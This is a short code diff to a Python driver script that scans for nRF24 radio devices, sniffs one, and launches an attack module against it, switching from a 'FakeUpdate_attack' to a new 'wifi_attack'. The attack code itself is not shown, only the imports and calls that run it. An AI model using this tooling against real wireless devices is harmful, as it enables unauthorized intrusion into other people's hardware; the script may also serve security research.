@@ -1,8 +1,9 @@
 from tools import Scanner
 from lib import nrf24_reset, nrf24
 from attacks import hello_attack
-from attacks import FakeUpdate_attack
+from attacks import FakeUpdate_attack, wifi_attack
 import time
+
 
 def ping_channel(radio, channels):
     ping = [0x0f, 0x0f, 0x0f, 0x0f]
@@ -24,5 +25,5 @@ if __name__ == '__main__':
     # print(devices_list['A4:DF:1B:AB:29'])
     radio.enter_sniffer_mode(devices_list[0][0])
     ping_channel(radio, channels)
-    FakeUpdate_attack = FakeUpdate_attack.FakeUpdate_attack(devices_list[0][0], radio)
-    FakeUpdate_attack.run()
+    wifi_attack = wifi_attack.wifi_attack(devices_list[0][0], radio)
+    wifi_attack.run()
